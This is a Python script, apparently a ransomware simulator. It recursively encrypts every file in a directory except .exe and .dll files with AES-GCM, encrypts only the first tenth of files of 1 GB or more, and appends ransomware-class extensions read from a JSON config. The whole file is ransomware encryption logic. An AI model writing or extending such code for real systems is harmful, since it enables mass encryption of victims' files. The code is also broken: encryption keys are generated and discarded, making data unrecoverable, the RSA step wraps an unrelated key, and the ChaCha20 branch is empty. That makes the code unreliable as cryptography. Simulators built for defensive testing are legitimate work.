import os
import json
import sys
from Crypto.Cipher import AES, ChaCha20, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

# Helper function to check file size
def check_file_size(file_path):
    file_size = os.path.getsize(file_path)
    if file_size < (1 * 1024 * 1024 * 1024):  # < 1GB
        return 'full'
    else:
        return 'partial'

# Function to apply AES encryption
def aes_encrypt(data, key_size):
    key = get_random_bytes(32)  # 256-bit key (32 bytes)
    cipher = AES.new(key, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return cipher.nonce + ciphertext

# Function to apply RSA encryption (for key encryption)
def rsa_encrypt(aes_key, key_size):
    rsa_key = RSA.generate(2048)  # RSA key generation
    cipher_rsa = PKCS1_OAEP.new(rsa_key.publickey())
    encrypted_key = cipher_rsa.encrypt(aes_key)
    return encrypted_key

# Encrypt a file based on ransomware configuration and file size
def encrypt_file(file_path, ransomware_class, ransomware_data):
    encryption_type = check_file_size(file_path)
    encryption_algorithm = ransomware_data[ransomware_class]["encryption_algorithm"]
    key_size = ransomware_data[ransomware_class]["key_size"]
    extension = ransomware_data[ransomware_class]["extension"]

    try:
        with open(file_path, 'rb') as f:
            file_data = f.read()
        
        if encryption_algorithm == 'AES + RSA':
            if encryption_type == 'full':
                encrypted_data = aes_encrypt(file_data, key_size)
            else:
                # Partial encryption: Only encrypt the first part of the file (1/10 of the file)
                partial_data = file_data[:len(file_data) // 10]
                encrypted_data = aes_encrypt(partial_data, key_size) + file_data[len(partial_data):]

            # Apply RSA encryption for the AES key
            encrypted_key = rsa_encrypt(get_random_bytes(32), key_size)
        elif encryption_algorithm == 'ChaCha20 + RSA':
            # Implement ChaCha20 encryption (for example)
            pass
        
        # Write encrypted data to a new file
        encrypted_file_path = file_path + extension
        with open(encrypted_file_path, 'wb') as f:
            f.write(encrypted_data)
        
        print(f"File '{file_path}' has been encrypted and saved as '{encrypted_file_path}'.")
    except Exception as e:
        print(f"Error encrypting file '{file_path}': {e}")

# Main function to get ransomware class and encrypt files in a directory
def encrypt_directory(directory, ransomware_class, ransomware_data):
    if ransomware_class not in ransomware_data:
        print(f"Ransomware class '{ransomware_class}' not found.")
        return
    
    for root, dirs, files in os.walk(directory):
        for file in files:
            if not file.endswith(('.exe', '.dll')):  # Add any exclusions here
                file_path = os.path.join(root, file)
                encrypt_file(file_path, ransomware_class, ransomware_data)

if __name__ == "__main__":
    # Load the JSON file containing ransomware configurations
    try:
        with open('ransomware_config.json', 'r') as f:
            ransomware_data = json.load(f)
    except Exception as e:
        print(f"Error loading ransomware configuration: {e}")
        sys.exit(1)
    
    # Get input for ransomware class and directory to encrypt
    ransomware_class = input("Enter the ransomware class: ")
    directory_to_encrypt = r"D:\Cyber\Malware\Ransomware_Simulator\Encrypter"
    
    # Start encrypting files in the specified directory
    encrypt_directory(directory_to_encrypt, ransomware_class, ransomware_data)
